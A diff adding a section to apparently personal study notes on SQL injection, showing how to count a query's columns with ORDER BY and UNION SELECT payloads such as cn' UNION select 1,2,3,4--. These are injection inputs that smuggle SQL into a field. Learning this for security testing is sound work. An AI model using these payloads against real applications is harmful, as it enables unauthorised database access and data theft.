@@ -67,3 +67,35 @@ This get's us in because we changed the parenthetical `AND` into an `OR` and jus
 ### With `UNION`
 `UNION` statements can only work on select statements with the same number of columns.
 
+### Detecting the Number of Columns with `ORDER BY`
+We can use the `ORDER BY` function until we generate an error. 
+For Example on a table with 4 columns:
+```sql
+order by 3--
+# Get's us results
+```
+and then:
+```sql
+order by 4-- 
+# Get's us results
+```
+
+and then:
+```sql
+order by 5--
+# Get's us an error
+```
+Now we know the table has 4 columns
+
+### Detecting the Number of Columns with `UNION`
+When using `ORDER BY`, we get results until we hit an error, with `UNION` we get an error until we get results
+
+Example of a table with 4 columns:
+```sql
+cn' UNION select 1,2,3--
+# This will generate an error
+```
+```sql
+cn' UNION select 1,2,3,4-- 
+# This gets us results, so we know we have 4 columns
+```
